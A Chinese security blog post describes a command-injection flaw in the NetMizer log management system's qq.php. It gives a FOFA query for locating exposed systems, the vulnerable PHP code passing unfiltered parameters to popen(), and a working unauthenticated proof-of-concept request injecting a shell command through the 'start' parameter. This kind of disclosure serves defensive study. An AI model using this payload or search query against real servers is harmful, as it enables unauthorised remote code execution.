---
title: "NetMizer日志管理系统 qq.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-qq-start-rce.html
asset_dir: assets/netmizer日志管理系统-qq.php-命令执行漏洞
---

# NetMizer日志管理系统 qq.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/18 08:30
- 838浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

服务器

qq

应用

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/qq.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

短信和即时消息

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `qq.php` 业务实现关键逻辑部分

```
<?php
        include('../include/JSON.php');

        $cmd = "/var/www/cgi-bin/search_qq";

        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
        $start_time = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -s $start_time";
        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
        $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -e $stop_time";

        if($nodeid != ""){
                $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
                $cmd .= " -n $nodeid";
        } else        $sql_nodeid = "";

        $srcip = $src;
        if($srcip == ""){
                $srcid = "-1";
        } else $srcid = ip2long($srcip); 
        if($srcid != "-1"){
                $sql_srcid = " and src_addr = $srcid ";
                $cmd .= " -S $srcid";
        } else {
                $sql_srcid = "";
        }

        $user = $username;
        if($user != ""){
                $sql_user = " and user_name = \"$user\" ";
                $cmd .= " -u $user";
        } else {
                $sql_user = "";
        }

        if($qq != ""){
                $sql_qq = " and from_num = $qq ";
                $cmd .= " -q $qq";
        } else {
                $sql_qq = "";
        }

        if(!isset($start)) $start = 0;
        $cmd .= " -f $start -t 100000";

        if($action == 'file'){
                //echo $cmd."\n";
                $fp = @popen($cmd,"r");
```

深入探索

网络安全课程

传输层安全性协议

企业安全咨询

用户可控参数直接拼接进系统命令字符串 `$cmd` 中，并通过 `popen($cmd, "r")` 执行。参数如 `$nodeid`、`$srcid`、`$user`、`$qq` 和 `$start` 来自用户输入，未经过任何过滤或转义。这些参数在命令构建过程中直接插入，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

漏洞修复方案

```
GET /data/search/qq.php?action=file&start=1;sleep+3+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 qq.php 命令执行漏洞](images/img-001-313926f0305b.webp)](https://image.mrxn.net/910a589657f4434dbe89d301e4876450.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
